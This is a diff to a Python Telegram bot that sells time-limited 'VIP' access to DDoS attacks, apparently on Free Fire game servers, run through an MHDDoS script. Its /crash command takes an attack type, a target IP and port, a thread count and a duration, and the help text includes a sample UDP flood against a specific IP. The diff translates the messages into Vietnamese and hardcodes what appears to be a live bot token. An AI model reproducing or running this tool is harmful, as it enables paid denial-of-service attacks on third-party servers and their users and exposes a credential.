@@ -6,8 +6,8 @@ from threading import Lock
 import time
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-BOT_TOKEN = "TOKEN AQUI"
-ADMIN_ID = 7178876305
+BOT_TOKEN = "7933828288:AAFX_Ab0wAdOUMnTqIaL2CX1bJX2PpQAqFQ"
+ADMIN_ID = 6454123620
 START_PY_PATH = "/workspaces/MHDDoS/start.py"
 
 bot = telebot.TeleBot(BOT_TOKEN)
@@ -44,19 +44,19 @@ def handle_start(message):
     if result:
         expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
         if datetime.now() > expiration_date:
-            vip_status = "❌ *Seu plano VIP expirou.*"
+            vip_status = "❌ *No.*"
         else:
             dias_restantes = (expiration_date - datetime.now()).days
             vip_status = (
-                f"✅ CLIENTE VIP!\n"
-                f"⏳ Dias restantes: {dias_restantes} dia(s)\n"
-                f"📅 Expira en: {expiration_date.strftime('%d/%m/%Y %H:%M:%S')}"
+                f"✅ BOT VIP!\n"
+                f"⏳ Số Ngày Dùng Vip: {dias_restantes} dia(s)\n"
+                f"📅 Ngày Hết Hạng: {expiration_date.strftime('%d/%m/%Y %H:%M:%S')}"
             )
     else:
-        vip_status = "❌ *No tienes un plan vip activo.*"
+        vip_status = "❌ *No.*"
     markup = InlineKeyboardMarkup()
     button = InlineKeyboardButton(
-        text="💻 VENDEDOR - OFICIAL 💻",
+        text="💻 ADMIN 💻",
         url=f"tg://user?id={ADMIN_ID}"
 
     )
@@ -65,21 +65,21 @@ def handle_start(message):
     bot.reply_to(
         message,
         (
-            "🤖 *BIENVENIDO AL CRASH BOT [Free Fire]!*"
+            "🤖 *BOT LAG [Free Fire]!*"
             
 
             f"""
 ```
 {vip_status}```\n"""
-            "📌 *Como usar:*"
+            "📌 *Cách Dùng:*"
             """
 ```
 /crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>```\n"""
-            "💡 *Ejemplo:*"
+            "💡 *Ví Dụ:*"
             """
 ```
 /crash UDP 143.92.125.230:10013 10 900```\n"""
-            "💠 KrizzZModz 🇵🇪 USERS VIP 💠"
+            "💠 Cường VIP 🇻🇳 💠"
         ),
         reply_markup=markup,
         parse_mode="Markdown",
@@ -89,14 +89,14 @@ def handle_start(message):
 @bot.message_handler(commands=["vip"])
 def handle_addvip(message):
     if message.from_user.id != ADMIN_ID:
-        bot.reply_to(message, "❌ No eres un vendededor autorizado.")
+        bot.reply_to(message, "❌ No.")
         return
 
     args = message.text.split()
     if len(args) != 3:
         bot.reply_to(
             message,
-            "❌ Formato inválido. Use: `/vip <ID> <QUANTOS DIAS>`",
+            "❌ No. Use: `/vip <ID> <Số Ngày Dùng Vip 10-999>`",
             parse_mode="Markdown",
         )
         return
@@ -115,7 +115,7 @@ def handle_addvip(message):
         )
         conn.commit()
 
-    bot.reply_to(message, f"✅ Usuário {telegram_id} agregado como VIP por {days} dias.")
+    bot.reply_to(message, f"✅ {telegram_id} VIP {days} Số Ngày Dùng Vip.")
 
 
 @bot.message_handler(commands=["crash"])
@@ -130,16 +130,16 @@ def handle_ping(message):
         result = cursor.fetchone()
 
     if not result:
-        bot.reply_to(message, "❌ No tienes permiso para usar este comando.")
+        bot.reply_to(message, "❌ No.")
         return
 
     expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
     if datetime.now() > expiration_date:
-        bot.reply_to(message, "❌ Su acceso vip Expiró")
+        bot.reply_to(message, "❌ No.")
         return
 
     if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 10:
-        bot.reply_to(message, "❌ Espera 10 segundos antes de iniciar otro ataque y recuerda parar el anterior.")
+        bot.reply_to(message, "❌ No.")
         return
 
     args = message.text.split()
@@ -147,10 +147,10 @@ def handle_ping(message):
         bot.reply_to(
             message,
             (
-                "❌ *Formato inválido!*\n\n"
-                "📌 *Uso correto:*\n"
+                "❌ *No!*\n\n"
+                "📌 *Cách Dùng:*\n"
                 "`/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n"
-                "💡 *Ejemplo:*\n"
+                "💡 *Ví Dụ:*\n"
                 "`/crash UDP 143.92.125.230:10013 10 900`"
             ),
             parse_mode="Markdown",
@@ -168,17 +168,17 @@ def handle_ping(message):
     cooldowns[telegram_id] = time.time()
 
     markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("⛔ Detener Ataque", callback_data=f"stop_{telegram_id}"))
+    markup.add(InlineKeyboardButton("⛔", callback_data=f"stop_{telegram_id}"))
 
     bot.reply_to(
         message,
         (
-            "*[✅] ATAQUE INICIADO - 200 [✅]*\n\n"
-            f"🌐 *Puerto:* {ip_port}\n"
-            f"⚙️ *Tipo:* {attack_type}\n"
+            "*[✅] Thành Công [✅]*\n\n"
+            f"🌐 *Địa Chỉ:* {ip_port}\n"
+            f"⚙️ *Loại Tấn Công:* {attack_type}\n"
             f"🧟‍♀️ *Threads:* {threads}\n"
-            f"⏳ *Tiempo (ms):* {duration}\n\n"
-            f"💠 KrizzZModz 🇵🇪 USERS VIP 💠"
+            f"⏳ *Thời Gian (ms):* {duration}\n\n"
+            f"💠 Cường VIP 🇻🇳 💠"
         ),
         reply_markup=markup,
         parse_mode="Markdown",
@@ -191,7 +191,7 @@ def handle_stop_attack(call):
 
     if call.from_user.id != telegram_id:
         bot.answer_callback_query(
-            call.id, "❌ Solo el usuario que inicio el ataque puede pararlo"
+            call.id, "❌ No."
         )
         return
 
@@ -200,9 +200,9 @@ def handle_stop_attack(call):
         process.terminate()
         del active_attacks[telegram_id]
 
-        bot.answer_callback_query(call.id, "✅ Ataque parado con éxito.")
+        bot.answer_callback_query(call.id, "✅")
         bot.edit_message_text(
-            "*[⛔] ATAQUE FINALIZADO[⛔]*",
+            "*[⛔][⛔]*",
             chat_id=call.message.chat.id,
             message_id=call.message.id,
             parse_mode="Markdown",
@@ -210,7 +210,7 @@ def handle_stop_attack(call):
         time.sleep(3)
         bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
     else:
-        bot.answer_callback_query(call.id, "❌ No se encontro ningun ataque, siga con su acción.")
+        bot.answer_callback_query(call.id, "❌ No.")
 
 if __name__ == "__main__":
     bot.infinity_polling()
